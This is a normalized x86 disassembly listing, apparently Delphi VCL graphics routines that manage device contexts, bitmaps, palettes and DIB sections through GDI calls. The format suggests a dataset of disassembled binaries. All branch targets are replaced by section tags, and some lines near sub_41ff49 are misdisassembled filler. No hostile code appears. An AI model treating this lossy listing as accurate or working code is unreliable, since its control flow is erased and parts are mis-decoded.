mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41fe2a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fe51
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_41fe58
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403264
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_41fea8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_41ff00
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_41fea8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ff49
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4031dc
mov edi eax
mov eax esi
call sub_4031dc
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420083
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420066
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407ca0
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42006d
mov al 0x1
sub_42009c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_416ae0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4200e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4200eb
mov eax [ ebp - 0x4 ]
call sub_403294
retn
sub_4200f0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_420124
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_416ae0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42016f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420176
mov eax [ ebp - 0x4 ]
call sub_403294
retn
sub_420238
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_414534
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4202d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4202dd
mov eax [ rw-data ]
call sub_414598
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_4202ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4203c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41e7fc
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_414170
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41e7a0
test al al
je r-xdata
sub_4202e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_414534
mov esi eax
xor ecx ecx
push ebp
push sub_420354
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414598
retn
mov edx ebx
mov eax esi
call sub_414170
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_4203c8
sub_420360
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41e2d4
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_42039c
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax esi
call sub_4203c8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e398
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_4203c8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41e5d8
xor edx edx
push ebp
push sub_42045c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41e984
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_414548
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e7fc
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_420468
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41e5d8
xor eax eax
push ebp
push sub_420547
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_421784
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_4202e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_421884
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41e984
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4144ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e7fc
retn
sub_420558
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403294
sub_420578
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_4202e4
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d19c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_4205d4
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_41cc28
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_4202e4
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_4202e4
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_420620
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_41f484
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4206cf
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4206dc
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_420728
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4202e4
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_41ecf0
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41ecf0
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_420d76
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026e4
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_420a80
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_41ebdc
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_41ecf0
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_41ecf0
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_41ecf0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_41ecf0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_420d27
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_420d16
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_420cf4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_41ecf0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_4206dc
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028e0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_41f484
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41e1b8
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_412d08
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41d4f8
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41e17c
call sub_41d4f8
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_41ec48
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420cfb
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41ecf0
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_420cca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41ecf0
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_402704
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41d4f8
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41e17c
call sub_41d4f8
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41d4f8
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41e17c
call sub_41d4f8
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41ecf0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403ab4
call sub_403ab4
jmp r-xdata
sub_420d1d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_420d2c
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403a30
call sub_403a84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_420d8c
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_420df0
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_4202e4
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_420feb
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_41ecf0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41ecf0
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41ecf0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420fa3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
